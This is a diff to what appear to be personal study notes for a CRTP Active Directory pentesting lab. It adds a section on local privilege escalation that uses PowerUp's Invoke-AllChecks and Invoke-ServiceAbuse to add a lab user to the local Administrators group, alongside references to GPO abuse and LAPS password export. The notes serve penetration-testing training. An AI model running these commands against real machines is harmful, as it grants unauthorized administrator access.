@@ -398,6 +398,7 @@ check video#12 and lab manual page#26
 > 15. [ ] Backup Operators (Disk shadow + Robocopy)
 > 16. [ ] Abusing GPO permissions
 > 17. [ ] Export LAPS Passwords
+> 18. [ ] Common for the course
 Windows Enumeration:
 - system enum
 ```
@@ -1516,6 +1517,37 @@ C:\Scripts\LAPSexport.ps1
 ```
 
 3. Then, run the script to verify it works correctly. If it does, you should automate this procedure by creating a Scheduled Task.
+
+# <span style="color:lightblue">Common for the course</span>
+
+## <span style="color:lightgreen">Methodology</span>
+
+## <span style="color:lightgreen">Detection</span>
+
+## <span style="color:lightgreen">Exploitation</span>
+1. Load PowerUp.ps1 and run `"Invoke-AllChecks"`
+2. focus on the AbuseFunction
+![image](https://github.com/AbdullahZuhair21/CRTP/assets/154827329/986a5c8b-a827-43ca-9ce5-0ec5462f435c)
+3. check how you can abuse the service
+```
+help Invoke-ServiceAbuse -Examples
+```
+![image](https://github.com/AbdullahZuhair21/CRTP/assets/154827329/3eafb7ba-670e-4696-949f-a62a92aede26)
+
+4. you will get a lot of examples. choose the best. it will return a command that ran to abuse the service
+```
+Invoke-ServiceAbuse -Name 'AbyssWebServer' -Username dcorp\student1 -Verbose
+```
+![image](https://github.com/AbdullahZuhair21/CRTP/assets/154827329/b4eaa773-093a-4c22-9ab3-a2968993cf66)
+
+5. check the Administrator group
+```
+net localgroup Administrators
+```
+![image](https://github.com/AbdullahZuhair21/CRTP/assets/154827329/f26431e6-a234-48d2-a258-8256756a3031)
+
+your user will be added to the administrator group. just refresh the windows machine by logoff and login again.
+6. run `"cmd"` as administrator
 
 # BloodHound Enumeration   Need Admin Privs
 ### Start BloodHound
